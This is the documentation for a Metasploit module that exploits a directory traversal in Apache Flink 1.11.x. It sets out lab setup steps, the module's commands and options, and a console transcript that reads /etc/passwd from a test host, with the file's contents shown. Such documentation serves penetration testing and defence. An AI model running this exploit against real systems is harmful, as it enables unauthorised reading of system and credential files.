## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability
in [Apache Flink](https://flink.apache.org) versions 1.11.0 <= 1.11.2.

The JobManager REST API fails to validate user-supplied log file paths,
allowing retrieval of arbitrary files with the privileges of the web server user.

This module has been tested successfully on:

* Apache Flink version 1.11.2 on Ubuntu 18.04.4.

## Verification Steps

```sh
wget 'https://archive.apache.org/dist/flink/flink-1.11.2/flink-1.11.2-bin-scala_2.11.tgz'
tar zxvf flink-1.11.2-bin-scala_2.11.tgz
cd flink-1.11.2/
./bin/start-cluster.sh
```

Metasploit:

1. `./msfconsole`
1. `use auxiliary/scanner/http/apache_flink_jobmanager_traversal`
1. `set rhosts <rhost>`
1. `set filepath <file path>`
1. `run`

## Options

### FILEPATH

The path to the file to read (Default: `/etc/passwd`)

### DEPTH

Depth for path traversal (Default: `10`)

## Scenarios

### Apache Flink version 1.11.2 on Ubuntu 18.04.4

```
msf6 > use auxiliary/scanner/http/apache_flink_jobmanager_traversal 
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set rhosts 172.16.191.195
rhosts => 172.16.191.195
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > check
[*] 172.16.191.195:8081 - The target appears to be vulnerable. Apache Flink version 1.11.2 appears vulnerable.
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set filepath /etc/passwd
filepath => /etc/passwd
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > run

[*] Downloading /etc/passwd ...
[+] Downloaded /etc/passwd (2401 bytes)
[+] File /etc/passwd saved in: /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > cat /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
[*] exec: cat /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > 
```

